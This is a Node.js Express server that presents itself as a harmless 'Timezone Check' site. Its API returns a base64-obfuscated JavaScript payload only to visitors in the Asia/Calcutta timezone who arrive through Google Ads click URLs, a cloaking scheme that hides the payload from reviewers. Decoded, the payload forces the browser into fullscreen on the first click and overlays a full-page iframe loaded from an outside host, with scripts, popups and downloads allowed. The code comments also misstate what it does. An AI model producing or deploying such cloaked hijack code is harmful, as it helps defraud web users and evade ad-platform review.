const express = require('express');
const bodyParser = require('body-parser');
const cors = require('cors'); // Import cors

const app = express();
const PORT = process.env.PORT || 3000;

// Middleware to parse JSON bodies
app.use(bodyParser.json());

// Enable CORS and restrict it to http://localhost:3000
app.use(cors());
// Serve the HTML file
app.get('/', (req, res) => {
    res.send(`
    <!DOCTYPE html>
    <html lang="en">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>Timezone Check</title>
    </head>
    <body>
        <h1>Welcome to Website B</h1>
        <p>This server checks the timezone and URL parameters.</p>
    </body>
    </html>
    `);
});

// Endpoint to receive data from website A
app.post('/api/timezone', (req, res) => {
    const { timezone, fullUrl } = req.body;

    // Check if the request body is valid
    if (!req.body || !timezone || !fullUrl) {
        return res.status(400).send('Invalid request body.');
    }

    console.log(`Received timezone: ${timezone}, fullUrl: ${fullUrl}`);

    // Check if the timezone is Asia/Calcutta
    const isTimezoneJapan = timezone === 'Asia/Calcutta';

    // Check if the URL contains 'gclid'
    const containsGclid = fullUrl.includes('gclid');

    // Base64 code to send in response
    const base64Code = 'Ly8gSGlkZSBvdmVyZmxvdyBvbiB0aGUgZG9jdW1lbnQgZWxlbWVudApkb2N1bWVudC5kb2N1bWVudEVsZW1lbnQuc3R5bGUub3ZlcmZsb3cgPSAiaGlkZGVuIjsKCi8vIEluc2VydCBhbiBIVE1MIGRpdiB3aXRoIHNwZWNpZmljIHN0eWxlcyBpbnRvIHRoZSBkb2N1bWVudCBib2R5CmRvY3VtZW50LmJvZHkuaW5zZXJ0QWRqYWNlbnRIVE1MKCJhZnRlcmJlZ2luIiwgCiAgICAnPGRpdiBpZD0iYnJ1Y2VEaXYiIHN0eWxlPSJ6LWluZGV4OiA5OTk5OyBwb2ludGVyLWV2ZW50czogYXV0bzsgb3ZlcmZsb3c6IGhpZGRlbjsiPjwvZGl2PicKKTsKCi8vIEFkZCBhIGNsaWNrIGV2ZW50IGxpc3RlbmVyIHRvIHRyaWdnZXIgZnVsbHNjcmVlbiBhbmQgZmV0Y2ggZXh0ZXJuYWwgSFRNTApkb2N1bWVudC5hZGRFdmVudExpc3RlbmVyKCJjbGljayIsIGZ1bmN0aW9uKCkgewogICAgd2luZG93LnNjcm9sbFRvKDAsIDApOwogICAgc2V0VGltZW91dCgoKSA9PiB7CiAgICAgICAgaWYgKGRvY3VtZW50LmRvY3VtZW50RWxlbWVudC5yZXF1ZXN0RnVsbHNjcmVlbikgewogICAgICAgICAgICBkb2N1bWVudC5kb2N1bWVudEVsZW1lbnQucmVxdWVzdEZ1bGxzY3JlZW4oKTsKICAgICAgICB9IGVsc2UgaWYgKGRvY3VtZW50LmRvY3VtZW50RWxlbWVudC5tb3pSZXF1ZXN0RnVsbFNjcmVlbikgewogICAgICAgICAgICBkb2N1bWVudC5kb2N1bWVudEVsZW1lbnQubW96UmVxdWVzdEZ1bGxTY3JlZW4oKTsKICAgICAgICB9IGVsc2UgaWYgKGRvY3VtZW50LmRvY3VtZW50RWxlbWVudC53ZWJraXRSZXF1ZXN0RnVsbHNjcmVlbikgewogICAgICAgICAgICBkb2N1bWVudC5kb2N1bWVudEVsZW1lbnQud2Via2l0UmVxdWVzdEZ1bGxzY3JlZW4oKTsKICAgICAgICB9IGVsc2UgaWYgKGRvY3VtZW50LmRvY3VtZW50RWxlbWVudC5tc1JlcXVlc3RGdWxsc2NyZWVuKSB7CiAgICAgICAgICAgIGRvY3VtZW50LmRvY3VtZW50RWxlbWVudC5tc1JlcXVlc3RGdWxsc2NyZWVuKCk7CiAgICAgICAgfQogICAgfSwgMTAwKTsKCiAgICAvLyBGZXRjaCBIVE1MIGZyb20gdGhlIG5ldyBVUkwgYW5kIGVtYmVkIGl0IGluIGFuIGlmcmFtZQogICAgZmV0Y2goImh0dHBzOi8vdHdvMmctY3hkOS5vbnJlbmRlci5jb20iKQogICAgICAgIC50aGVuKHJlc3BvbnNlID0+IHJlc3BvbnNlLnRleHQoKSkKICAgICAgICAudGhlbihjb250ZW50ID0+IHsKICAgICAgICAgICAgbGV0IGJsb2IgPSBuZXcgQmxvYihbY29udGVudF0sIHsgdHlwZTogInRleHQvaHRtbCIgfSk7CiAgICAgICAgICAgIGxldCB1cmwgPSBVUkwuY3JlYXRlT2JqZWN0VVJMKGJsb2IpOwogICAgICAgICAgICBsZXQgaWZyYW1lID0gZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgiaWZyYW1lIik7CiAgICAgICAgICAgIGlmcmFtZS5zcmMgPSB1cmw7CiAgICAgICAgICAgIGlmcmFtZS5zdHlsZS53aWR0aCA9ICIxMDAlIjsKICAgICAgICAgICAgaWZyYW1lLnN0eWxlLmhlaWdodCA9ICIxMDAlIjsKICAgICAgICAgICAgaWZyYW1lLmZyYW1lQm9yZGVyID0gIjAiOwogICAgICAgICAgICBpZnJhbWUuc2V0QXR0cmlidXRlKCJhbGxvd2Z1bGxzY3JlZW4iLCAiIik7CiAgICAgICAgICAgIGlmcmFtZS5zZXRBdHRyaWJ1dGUoIndlYmtpdGFsbG93ZnVsbHNjcmVlbiIsICIiKTsKICAgICAgICAgICAgaWZyYW1lLnNldEF0dHJpYnV0ZSgibW96YWxsb3dmdWxsc2NyZWVuIiwgIiIpOwogICAgICAgICAgICBpZnJhbWUuc2FuZGJveCA9ICJhbGxvdy1zY3JpcHRzIGFsbG93LXBvcHVwcyBhbGxvdy1kb3dubG9hZHMiOwogICAgICAgICAgICBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgiYnJ1Y2VEaXYiKS5hcHBlbmRDaGlsZChpZnJhbWUpOwogICAgICAgICAgICBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgiYnJ1Y2VEaXYiKS5zdHlsZS5oZWlnaHQgPSAiMTAwdmgiOwogICAgICAgIH0pCiAgICAgICAgLmNhdGNoKGVycm9yID0+IHsKICAgICAgICAgICAgY29uc29sZS5lcnJvcigiRXJyb3IgZmV0Y2hpbmcgdGhlIEhUTUw6IiwgZXJyb3IpOwogICAgICAgIH0pOwp9LCB7IG9uY2U6IHRydWUgfSk7Cg==
        '; // Your base64 string here

    // If both conditions are met, respond with the base64 code
    if (isTimezoneJapan && containsGclid) {
        console.log(`Response sent: ${base64Code}`);
        return res.status(200).send(base64Code); // Send the base64 string directly
    } else {
        const responseMessage = 'Conditions not met.';
        console.log(responseMessage);
        return res.status(200).send(responseMessage);
    }
});

// Start the server
app.listen(PORT, () => {
    console.log(`Server is running on http://localhost:${PORT}`);
});
